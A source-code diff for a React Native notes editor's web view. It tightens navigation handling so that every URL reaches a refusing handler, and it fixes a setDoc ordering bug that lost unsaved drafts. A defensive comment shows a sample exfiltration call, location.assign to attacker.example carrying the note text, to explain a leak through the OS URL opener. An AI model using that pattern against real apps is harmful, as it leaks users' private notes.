@@ -140,6 +140,69 @@ export function escapeForScript(code: string): string {
 
 export const EDITOR_HTML = editorDocument(EDITOR_BUNDLE);
 
+/**
+ * NOTHING IN THIS DOCUMENT NAVIGATES, AND `["*"]` IS WHAT ENFORCES THAT.
+ *
+ * The live-preview decorations draw a link as a styled `<span>`, never an
+ * `<a href>`, so there is no in-page navigation to allow — and a web view
+ * holding somebody's private note has no business following a URL that appeared
+ * inside it. `allowInitialLoadOnly` below is the refusal. This constant exists
+ * to make sure it is *reached*.
+ *
+ * **`originWhitelist` is not a second, tighter refusal. It is a switch that
+ * decides who answers, and the narrow setting answers by opening Safari.**
+ * From `createOnShouldStartLoadWithRequest` in react-native-webview's
+ * `src/WebViewShared.tsx` (13.15.0, and unchanged for years):
+ *
+ *     if (!passesWhitelist(compileWhitelist(originWhitelist), url)) {
+ *       Linking.canOpenURL(url).then((supported) => {
+ *         if (supported) return Linking.openURL(url);   // <- the FULL url
+ *       });
+ *       shouldStart = false;
+ *     } else if (onShouldStartLoadWithRequest) {
+ *       shouldStart = onShouldStartLoadWithRequest(nativeEvent);
+ *     }
+ *
+ * The app's handler is in the `else`. A URL that *fails* the whitelist is not
+ * blocked and handed to us — it is handed to the operating system. So the
+ * previous value here, `["about:*"]`, did not narrow anything: a script in the
+ * document running `location.assign("https://attacker.example/?d=" + note)`
+ * failed the whitelist, was never shown to `allowInitialLoadOnly`, and was
+ * opened in Safari with the note in the query string.
+ *
+ * `"*"` compiles to `^.*`, which every URL passes, so every navigation reaches
+ * the handler below and is refused there with no `Linking` call at all. The
+ * broad-looking value is the closed one; the narrow-looking value is the
+ * exfiltration channel. The initial load is unaffected either way — the library
+ * prepends `about:blank` to the compiled list itself — so the whitelist has no
+ * work left to do for this web view, and the only thing it can still do is take
+ * the decision away from us.
+ *
+ * **This is the one channel the CSP cannot close**, which is why it is worth a
+ * page of comment over a one-character value. `editorDocument`'s
+ * `default-src 'none'; base-uri 'none'; form-action 'none'` stops fetching,
+ * framing, form posts and base rewriting; there is no directive in any browser
+ * that stops `location.assign()`. Tightening this back to `["about:*"]` reads
+ * exactly like hardening and restores the leak — the same shape as
+ * "an absent `Origin` is allowed; `null` is not". `webviewHost.test.ts` drives
+ * the library's own dispatch over both values and fails if this one stops
+ * reaching the handler.
+ */
+export const NAVIGATION_ORIGINS: readonly string[] = Object.freeze(["*"]);
+
+/**
+ * The only navigation this web view performs is the one that loads it.
+ *
+ * Everything else — a link somebody pasted into their note, a redirect a
+ * malformed decoration produced, a `location.assign` from a script that should
+ * not exist — is refused. `false` here means the load does not happen and
+ * nothing is handed to the operating system; see `NAVIGATION_ORIGINS` for why
+ * that requires the whitelist to be wide open.
+ */
+export function allowInitialLoadOnly(request: { url: string }): boolean {
+  return request.url === "about:blank" || request.url.startsWith("about:");
+}
+
 export interface HostSink {
   onChange: (text: string) => void;
   onSave: () => void;
@@ -217,9 +280,29 @@ export function createHostBridge(send: (raw: string) => void, sink: HostSink): H
 
   return {
     setDoc: (text) => {
+      /*
+        `doc` is assigned BEFORE the echo check, and `known` after it, and the
+        difference between those two lines is somebody's unsaved note.
+
+        They are answering different questions. `known` is what the guest is
+        believed to hold, so an echo must leave it alone — that is the guard
+        that keeps the caret where the person put it. `doc` is what the *next*
+        `ready` will be answered with, and an echo is still authoritative text:
+        it is the round trip of what the person just typed.
+
+        Assigning it inside the echo branch's shadow froze it at the text the
+        note was opened with. A WKWebView reload — which this bridge resends
+        state for precisely because one can happen on its own after a memory
+        warning — then rewound the editor to that text, and because
+        `replaceDocument` is annotated `externalDoc` no `change` came back, so
+        `known` was left naming the rewound document and the next keystroke
+        overwrote the draft. No undo entry, nothing said. Moving this line back
+        under the check looks like tightening the echo guard and is silent data
+        loss; see `webviewHost.test.ts`'s second `ready`.
+      */
+      doc = text;
       if (echoes(text, known)) return;
       known = text;
-      doc = text;
       post({ v: PROTOCOL_VERSION, type: "doc", text });
     },
     setEditable: (next) => {
